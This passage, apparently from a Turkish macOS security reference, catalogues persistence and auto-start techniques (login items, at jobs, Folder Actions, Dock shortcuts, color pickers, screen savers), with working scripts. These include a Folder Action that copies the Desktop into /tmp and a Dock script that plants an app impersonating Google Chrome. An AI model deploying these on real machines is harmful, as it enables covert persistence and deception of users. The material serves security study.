Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Sandbox'ı atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Ancak `osascript`'i argümanlarla çalıştırmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konumlar

- **Kayıtlı giriş öğesi yardımcı uygulaması:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (yaygın paketlenmiş konum).
  - **Tetikleyici:** Kayıt işlemi yardımcı uygulamayı hemen başlatabilir; onay durumuna bağlı olarak yardımcı uygulama sonraki kullanıcı oturum açma işlemlerinde de başlar.
- **Kayıtlı paketlenmiş agent/daemon:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` veya `Contents/Library/LaunchDaemons/<name>.plist`.
  - **Tetikleyici:** Onaylanmış bir agent, kayıt sırasında ve sonraki oturum açma işlemlerinde başlayabilir; onaylanmış bir daemon ise önyükleme sırasında başlar. Bir daemon için yönetici onayı gerekir.

#### Açıklama

Kullanıcılar **Sistem Ayarları → Genel → Giriş Öğeleri ve Uzantılar** bölümünden giriş ve arka plan öğelerini inceleyebilir. macOS 13 ve sonraki sürümlerde, paketlenmiş giriş öğelerini, launch agent'ları ve launch daemon'ları kaydetmek için [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) sunulur. [`register()` davranışı](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29), öğe türüne ve onay durumuna göre değişir. **Bir yardımcı uygulamayı uygulama paketine yazmak, yeni bir giriş öğesi kaydetmek için yeterli değildir.** Buna karşılık, önceden kaydedilmiş bir yardımcı uygulama yürütülebilir dosyası yazılabilir durumdaysa bu dosyanın değiştirilmesi, yeni bir kayıt işlemi olmadan sonraki başlatmayı etkileyebilir; önce gerçek yolu ve kod imzalama denetimlerini doğrulayın.

Aşağıdaki yöntem, Mac'te paketlenmiş yardımcı uygulamaları aramak için salt okunur bir yöntemdir; hiçbirini kaydetmez veya başlatmaz:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

Bir paketlenmiş launch plist için `BundleProgram` değerini [Apple'ın Service Management taşıma yönergelerinde](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos) belirtildiği gibi **app bundle köküne göre** çözümleyin (örneğin `Contents/MacOS/Helper`). Araştırma Mac'inde salt okunur `/Applications` envanterinde 14 paketlenmiş yardımcı girişi ve beş `BundleProgram` bildirimi bulundu; beş hedefin tümü çözümlendi ve ikisi kullanıcı tarafından yazılabilirlik kontrolünü geçti. Bu kontrol, yardımcı programlardan herhangi birinin kayıtlı, etkin, imza doğrulamasından sonra yürütülebilir veya bir sandbox tarafından erişilebilir olduğunu **kanıtlamaz**. `sfltool dumpbtm`, bu Mac'te adı olan 150 kayıt listeledi; bu bir inceleme aracıdır, her kaydın çalıştığını doğrulayan bir test değildir.

Daha eski login item'lar Apple events aracılığıyla da yönetilebilir. Bunları komut satırından listelemek, eklemek ve kaldırmak mümkündür; ancak ekleme, kullanıcının kalıcı login yapılandırmasını değiştirir ve Automation onayı gerektirebilir:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`, bir payload'u yalnızca dosya yazarak kurmak için desteklenen bir konum değil, uygulama ayrıntısıdır. Eski `SMLoginItemSetEnabled` API'si, yeni yardımcılar için `SMAppService` ile değiştirilmiştir; sayfada daha önce belirtilen `/var/db/com.apple.xpc.launchd/loginitems.501.plist` yolu macOS 26.5.2 test makinesinde yoktu. Modern login item'ları değerlendirirken varsayılan bir veritabanı yoluna güvenmek yerine kayıt API'sini ve sistem arayüzünün durumunu kullanın.

### ZIP as Login Item

(Login Items hakkındaki önceki bölüme bakın; bu bir eklentidir)

Bir **ZIP** dosyasını **Login Item** olarak saklarsanız, **`Archive Utility`** dosyayı açar. Örneğin zip dosyası `~/Library` içinde saklanmış ve bir backdoor içeren **`LaunchAgents/file.plist`** klasörünü barındırmışsa, bu klasör oluşturulur (varsayılan olarak mevcut değildir) ve plist eklenir. Böylece kullanıcı bir sonraki oturum açışında **plist'te belirtilen backdoor çalıştırılır**.

Diğer bir seçenek, kullanıcı HOME dizininde **`.bash_profile`** ve **`.zshenv`** dosyalarını oluşturmaktır. Böylece LaunchAgents klasörü zaten varsa da bu teknik işe yarar.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Ancak **`at`**'i **çalıştırmanız** ve etkin olması gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`at`**'i **çalıştırmanız** ve etkin olması gerekir

#### **Description**

`at` görevleri, belirli zamanlarda çalıştırılacak **tek seferlik görevleri zamanlamak** için tasarlanmıştır. cron görevlerinden farklı olarak, `at` görevleri çalıştırıldıktan sonra otomatik olarak kaldırılır. Bu görevlerin sistem yeniden başlatmalarında kalıcı olduğunu ve belirli koşullarda güvenlik riski oluşturabileceğini unutmamak önemlidir.<sup>[[16]](#references)</sup>

Birlikte gelen `com.apple.atrun.plist` dosyasında `Disabled = true` ayarı bulunur, ancak launchd etkin/devre dışı durum geçersiz kılmalarını ayrı olarak tutar. macOS 26.5.2 test makinesinde `launchctl print-disabled system`, bu anahtara rağmen `com.apple.atrun` öğesini **etkin** olarak bildirdi. `at` görevlerinin çalışacağını öne sürmeden önce etkin durumu kontrol edin:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

Bir yönetici, `launchctl` ile devre dışı bırakılmış `atrun` hizmetini etkinleştirebilir; aşağıdaki tarihsel örnek sistem hizmetinin durumunu değiştirir ve araştırma Mac'inde **çalıştırılmamıştır**:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

Bu, 1 saat içinde bir dosya oluşturacak:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

İş kuyruğunu `atq:` kullanarak kontrol edin:

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

Yukarıda zamanlanmış iki görev görebiliriz. `at -c JOBNUMBER` kullanarak görevin ayrıntılarını yazdırabiliriz.

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> AT görevleri etkin değilse oluşturulan görevler yürütülmez.

**İş dosyaları** `/private/var/at/jobs/` konumunda bulunabilir.

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

Dosya adı kuyruğu, iş numarasını ve çalışmasının planlandığı zamanı içerir. Örneğin `a0001a019bdcd2` dosyasına bakalım.

- `a` - kuyruk
- `0001a` - onaltılık sistemde iş numarası, `0x1a = 26`
- `019bdcd2` - onaltılık sistemde zaman. Epoch'tan beri geçen dakikaları temsil eder. `0x019bdcd2`, ondalık sistemde `26991826` değerine karşılık gelir. Bunu 60 ile çarparsak `1619509560` elde ederiz; bu da `GMT: 2021. April 27., Tuesday 7:46:00` tarih ve saatidir.

İş dosyasını yazdırırsak `at -c` kullanarak elde ettiğimiz bilgilerin aynısını içerdiğini görürüz.

### Calendar açık dosya uyarıları

- **Yazma hedefi:** Bir Calendar etkinliğinin özel **Open file** uyarısında **önceden seçilmiş** yürütülebilir bir uygulama paketi veya başka bir dosya. Uyarının kendisini oluşturmak veya düzenlemek, Calendar üzerinden ya da kabul edilen bir takvim veri kaynağı aracılığıyla ilgili takvim etkinliğine erişim gerektirir; rastgele bir dosyaya yazmak uyarı oluşturmaz.
- **Tetikleyici:** Calendar'ın etkinliği işlediği Mac'te uyarının planlanan zamanı. Yinelenen bir etkinlik bu eylemi tekrar edebilir. [Apple'ın güncel Calendar kılavuzu](https://support.apple.com/guide/calendar/icl1012/mac), macOS 26'da **Custom → Open file** uyarı seçeneğinin bulunduğunu doğrular.
- **Çalıştırma kimliği ve kısıtlamalar:** Calendar, seçilen dosyayı oturum açmış kullanıcı için ilişkili uygulamasıyla açar. Bir uygulama paketini başlatmak, Gatekeeper, karantina ve diğer macOS denetimlerine tabi olarak kodunu o kullanıcı kimliğiyle çalıştırabilir. Düz bir betik dosyası yalnızca bir düzenleyicide açılabilir; dosya uzantısı tek başına kodun çalıştırıldığını kanıtlamaz.

Bir adayı güvenli biçimde değerlendirmek için Calendar'daki etkinlik uyarısını ve seçilen dosyanın izinlerini inceleyin. Bu yöntem Apple'ın kılavuzuna dayanarak belgelendi ve canlı bir takvimi değiştirmeyi ve masaüstü etkinliğini beklemeyi gerektireceği için araştırma Mac'inde denenmedi. Geçici bir hesapta yalnızca işaretleyici oluşturan bir uygulama paketi seçilip yakın bir zamana **Open file** uyarısı ayarlanabilir; başlatma doğrulandıktan sonra etkinlik ve uygulama silinebilir.

### macOS'te Shortcuts otomasyonları

- **Yazma hedefi:** Bir shortcut'ın eylemi tarafından **önceden referans verilmiş** yürütülebilir bir dosya veya yetkili kullanıcının düzenleyebileceği mevcut bir shortcut. Rastgele bir `.shortcut` dosyası ya da belgelenmemiş bir Shortcuts veritabanına yazmak, desteklenen bir otomasyon kaydetme yöntemi değildir.
- **Tetikleyici ve kimlik:** Günün saati veya uygulama etkinliği gibi önceden yapılandırılmış ve etkinleştirilmiş bir otomasyon olayı, shortcut'ı oturum açmış kullanıcı için çağırır. [Apple'ın güncel Mac otomasyon kılavuzu](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) desteklenen olayları listeler, bir otomasyonun ne zaman sormadan çalışabileceğini açıklar ve tetikleyicinin nasıl kaldırılacağını anlatır. [Apple'ın Shortcuts gizlilik kılavuzu](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac), betik eylemleri için **Allow Running Scripts** iznini gerektirir; tek tek eylemler yine de izin isteyebilir.

Bu, **yalnızca mevcut eylem yazılabilir bir hedefi yüklediğinde** geçerli olan koşullu bir yazmadan çalıştırmaya yoludur. Arayüz üzerinden yeni bir otomasyon oluşturmak canlı ayarları değiştirir; bu nedenle araştırma Mac'inde denenmedi. Geçici bir hesapta kullanıcı, betiği `/tmp/ht-shortcuts-marker` dosyasına dokunan bir günün saati shortcut'ı yapılandırabilir, gerekli izinleri etkinleştirebilir, olaydan sonra işaretleyiciyi doğrulayabilir ve ardından otomasyonu, shortcut'ı ve işaretleyiciyi silebilir.

### Automator eylemleri ve Quick Actions

- **Yazma hedefleri:** Eylem paketleri için `~/Library/Automator/*.action` (kullanıcı) ve `/Library/Automator/*.action` (yönetici). Kaydedilmiş bir Quick Action iş akışı genellikle `~/Library/Services/*.workflow` konumunda tutulur; kullanıcının seçtiği gerçek iş akışı yolunu kontrol edin. [Apple'ın Automator framework başvuru belgesi](https://developer.apple.com/documentation/automator), eylemlerin arandığı dizinleri listeler.
- **Tetikleyici:** Automator, çalıştığında kullanılabilir eylem paketlerini yükler; ancak bir eylemin görevi, onu kullanan iş akışı çalıştırıldığında yürütülür. Kullanıcı Quick Action'ı Finder, Services veya gösterildiği başka bir menüden seçtiğinde çalışır. Folder Action iş akışı, **önceden ilişkilendirilmiş** klasörüne öğeler eklendiğinde; Calendar Alarm iş akışı ise etkinlik zamanında çalışır. [Apple'ın iş akışı türleri](https://support.apple.com/guide/automator/aut7cac58839/mac) bu olayları birbirinden ayırır. Yalnızca bir eylem veya iş akışı yazmak, klasör ilişkilendirmez ya da takvim etkinliği planlamaz.
- **Çalıştırma kimliği ve kısıtlamalar:** İş akışını çalıştıran hesap; Automator veya çağıran uygulama eylemi yüklemeli ve yürürlükteki kod imzalama ya da gizlilik denetimleri buna izin vermelidir. Etkin bir iş akışının zaten referans verdiği yazılabilir bir eylem paketi, yeni bir eylem yükleyip seçilmesini beklemekten farklı bir durumdur.

Kullanıcıya ait `Automator` ve `Services` dizinleri macOS 26.5.2 test Mac'inde mevcuttu; `/Library/Automator` yoktu. Canlı bir iş akışı oluşturulmadı, ilişkilendirilmedi veya çalıştırılmadı. Belirli bir yükleme yolunu doğrulamak için geçici bir hesap ve yalnızca işaretleyici oluşturan bir eylem/iş akışı kullanın. Ayrı [Folder Actions](#folder-actions) bölümü bu olay kaynağını daha ayrıntılı ele alır.

### Folder Actions

Yazı: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Yazı: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Sandbox'ı atlatmak için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
  - Ancak Folder Actions'ı yapılandırmak için **`System Events`** ile iletişim kuracak argümanlarla `osascript` çağırabilmeniz gerekir.
- TCC atlatma: [🟠](https://emojipedia.org/large-orange-circle)
  - Desktop, Documents ve Downloads gibi bazı temel TCC izinlerine sahiptir.

#### Konum

- **`/Library/Scripts/Folder Action Scripts`**
  - Root gerekir
  - **Tetikleyici**: Belirtilen klasöre erişim
- **`~/Library/Scripts/Folder Action Scripts`**
  - **Tetikleyici**: Belirtilen klasöre erişim

#### Açıklama ve Exploitation

Folder Actions; öğe ekleme, kaldırma veya klasör penceresini açma ya da yeniden boyutlandırma gibi değişikliklerle otomatik olarak tetiklenen betiklerdir. Bu eylemler çeşitli görevler için kullanılabilir ve Finder arayüzü ya da terminal komutları gibi farklı yöntemlerle tetiklenebilir.<sup>[[17]](#references)[[18]](#references)</sup>

Folder Actions'ı ayarlamak için şu seçenekler bulunur:

1. [Automator](https://support.apple.com/guide/automator/welcome/mac) ile bir Folder Action iş akışı oluşturup hizmet olarak yüklemek.
2. Bir klasörün bağlam menüsündeki Folder Actions Setup aracılığıyla betiği elle ilişkilendirmek.
3. Folder Action'ı programlı olarak ayarlamak üzere `System Events.app` uygulamasına Apple Event mesajları göndermek için OSAScript kullanmak.
   - Bu yöntem, eylemi sisteme yerleştirerek bir kalıcılık düzeyi sağladığı için özellikle kullanışlıdır.

Aşağıdaki betik, bir Folder Action tarafından çalıştırılabilecek bir örnektir:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Yukarıdaki betiği Folder Actions tarafından kullanılabilir hâle getirmek için şu komutla derleyin:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

Script derlendikten sonra aşağıdaki scripti çalıştırarak Folder Actions'ı ayarlayın. Bu script, Folder Actions'ı genel olarak etkinleştirir ve önceden derlenmiş scripti özellikle Desktop klasörüne ekler.

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

Kurulum betiğini şu komutla çalıştırın:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- Bu kalıcılığı GUI üzerinden uygulamanın yolu:

Bu, çalıştırılacak script'tir:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

`osacompile -l JavaScript -o folder.scpt source.js` ile derleyin.

Şuraya taşı:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

Ardından `Folder Actions Setup` uygulamasını açın, **izlemek istediğiniz klasörü** seçin ve sizin durumunuzda **`folder.scpt`** dosyasını seçin (benim durumumda dosyaya output2.scp adını verdim):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Şimdi bu klasörü **Finder** ile açarsanız script'iniz çalıştırılır.

Bu yapılandırma, base64 formatında **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** konumundaki **plist** dosyasında saklanıyordu.

Şimdi bu kalıcılığı GUI erişimi olmadan hazırlamayı deneyelim:

1. Yedeklemek için **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** dosyasını `/tmp` konumuna **kopyalayın**:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. Az önce ayarladığınız Folder Actions'ı **kaldırın**:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Artık ortamımız boş olduğuna göre

3. Yedek dosyayı kopyalayın: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Bu yapılandırmayı yüklemek için Folder Actions Setup.app'i açın: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Bu benim için işe yaramadı, ancak writeup'taki talimatlar bunlar :(

### Dock kısayolları

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Sandbox'ı atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Ancak sisteme kötü amaçlı bir uygulama yüklemiş olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `~/Library/Preferences/com.apple.dock.plist`
  - **Tetikleyici**: Kullanıcı Dock içindeki uygulamaya tıkladığında

#### Açıklama ve Exploitation

Dock'ta görünen tüm uygulamalar plist içinde belirtilir: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

Yalnızca şu komutla **bir uygulama eklemek** mümkündür:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

Bazı **social engineering** yöntemleri kullanarak dock'ta örneğin **Google Chrome** gibi davranabilir ve kendi script'inizi gerçekten çalıştırabilirsiniz:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### Girdi Yöntemleri

- **Yazma hedefi:** `~/Library/Input Methods/` (kullanıcı) veya `/Library/Input Methods/` (yönetici) konumuna yüklenmiş, kod içeren bir girdi yöntemi uygulama paketi. Bu, kendi başına keyfi kod yükü olmayan Apple'ın düz metin `.inputplugin` klavye eşleme dosyalarından farklıdır.
- **Tetikleyici:** Kullanıcı, girdi kaynağını **Sistem Ayarları → Klavye → Metin Girişi** bölümünden ekler/etkinleştirir ve ardından seçer ya da kullanır. Bir paketin yalnızca dizine kopyalanmış olması, macOS'un onu başlatacağının kanıtı değildir. [Apple'ın güncel Girdi Kaynakları kılavuzu](https://support.apple.com/guide/mac-help/mchl84525d76/mac) kaynakların etkinleştirilmesini ve değiştirilmesini açıklar; [Apple'ın InputMethodKit belgeleri](https://developer.apple.com/documentation/inputmethodkit) kod içeren girdi yöntemlerini ele alır.
- **Yürütme kimliği ve koşullar:** Yöntem, oturum açmış kullanıcı adına çalışır ve girdi yöntemi kaydı, kod imzalama ve mevcut macOS güvenlik denetimlerine tabidir. Yazılabilir bir yürütülebilir dosyası olan mevcut etkin yöntemler için ayrıca yol ve imza incelemesi gerekir.

Apple'ın [eski üçüncü taraf girdi yöntemleri notunda](https://developer.apple.com/library/archive/qa/qa1810/_index.html), belirli palet yöntemlerini bu dizinlere kopyalamanın bunları Girdi Kaynakları'nda görünür hâle bile getirmeyebileceği zaten belirtilmişti. macOS 26.5.2 araştırma Mac'inde kullanıcı dizini mevcut, ancak herhangi bir paket yüklenmemiş veya etkinleştirilmemişti; dolayısıyla bu, yerel çalışma zamanı sonucu değil, belgelenmiş koşullu bir yoldur.

### Renk Seçiciler

Yazı: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Sandbox'ı aşmak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
  - Çok belirli bir eylemin gerçekleşmesi gerekir
  - Başka bir sandbox içinde olursunuz
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `/Library/ColorPickers`
  - Root gerekir
  - Tetikleyici: Renk seçiciyi kullanmak
- `~/Library/ColorPickers`
  - Tetikleyici: Renk seçiciyi kullanmak

#### Açıklama ve Exploit

Kodunuzu içeren bir **renk seçici** paketi derleyin (örneğin [**bunu**](https://github.com/viktorstrate/color-picker-plus) kullanabilirsiniz), bir constructor ekleyin ([Ekran Koruyucu bölümündeki](macos-auto-start-locations.md#screen-saver) gibi) ve paketi `~/Library/ColorPickers` konumuna kopyalayın.<sup>[[20]](#references)</sup>

Ardından, renk seçici tetiklendiğinde paketiniz de çalışmalıdır.

Bunun çalışması, uyumlu bir uygulamanın sistem renk panelini açmasına ve yüklenen seçiciyi seçmesine bağlıdır. [Apple'ın renk paneli kılavuzu](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html), eski paket konumlarını açıklar. Yerel bir yol denetiminde eski renk seçici XPC hizmeti bulundu, ancak araştırma Mac'inde herhangi bir seçici yüklenmemiş veya çalıştırılmamıştı; yalnızca yola bakarak TCC bypass olduğu sonucuna varmayın.

Kitaplığınızı yükleyen ikili dosyanın **çok kısıtlayıcı bir sandbox'ı** olduğunu unutmayın: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync Eklentileri

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- sandbox bypass için kullanışlı: **Hayır, çünkü kendi uygulamanızı çalıştırmanız gerekir**
- TCC bypass: Etkin uzantının sandbox ve izinlerine bağlıdır; genel bir bypass belirlenmemiştir.

#### Konum

- Belirli bir uygulama

#### Açıklama ve Exploit

Finder Sync Extension içeren bir uygulama örneği [**burada bulunabilir**](https://github.com/D00MFist/InSync).

Uygulamalarda `Finder Sync Extensions` bulunabilir. Bu uzantı, çalıştırılacak bir uygulamanın içine yerleştirilir. Ayrıca, uzantının kodunu çalıştırabilmesi için **geçerli bir Apple geliştirici sertifikasıyla imzalanmış** ve **sandbox içinde çalışıyor** olması (gevşetici istisnalar eklenebilse de) ve aşağıdaki gibi bir komutla kaydedilmesi gerekir:<sup>[[21]](#references)[[22]](#references)</sup>

Yüklenmiş bir uzantının ayrıca **etkinleştirilmesi** ve ilgili Finder konumu veya öğesi için çağrılması gerekir; rastgele bir `.appex` paketi yazmak yeterli değildir. [Apple'ın Finder Sync API'si](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) etkin durumu gösterir. Aşağıdaki `pluginkit` komutları açıkça kayıt ve etkinleştirme işlemlerini gösterir; yalnızca dosyaya dayalı bir otomatik başlatmayı değil. Bu yöntem dokümantasyon açısından incelenmiş, araştırma Mac'inde yeni bir uzantı yüklenmemiş veya etkinleştirilmemiştir.

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Ekran Koruyucu

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
  - Ancak yaygın bir uygulama sandbox'ına düşersiniz
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `/System/Library/Screen Savers`
  - Root gerekir
  - **Tetikleyici**: Ekran koruyucuyu seçin
- `/Library/Screen Savers`
  - Root gerekir
  - **Tetikleyici**: Ekran koruyucuyu seçin
- `~/Library/Screen Savers`
  - **Tetikleyici**: Ekran koruyucuyu seçin

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Açıklama ve Exploit

Xcode'da yeni bir proje oluşturun ve yeni bir **Ekran Koruyucu** oluşturmak için şablonu seçin. Ardından kodunuzu ekleyin; örneğin, loglar oluşturmak için aşağıdaki kodu kullanabilirsiniz.<sup>[[23]](#references)[[24]](#references)</sup>

Derleyin ve `.saver` bundle'ını **`~/Library/Screen Savers`** konumuna kopyalayın. Ardından Ekran Koruyucu GUI'sini açın ve üzerine tıklamanız yeterli; çok sayıda log oluşturması gerekir:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> Bu kodu yükleyen binary'nin (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) entitlements'ında **`com.apple.security.app-sandbox`** bulunduğuna dikkat edin; bu nedenle **ortak uygulama sandbox'ının içinde olursunuz**.

Saver kodu:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

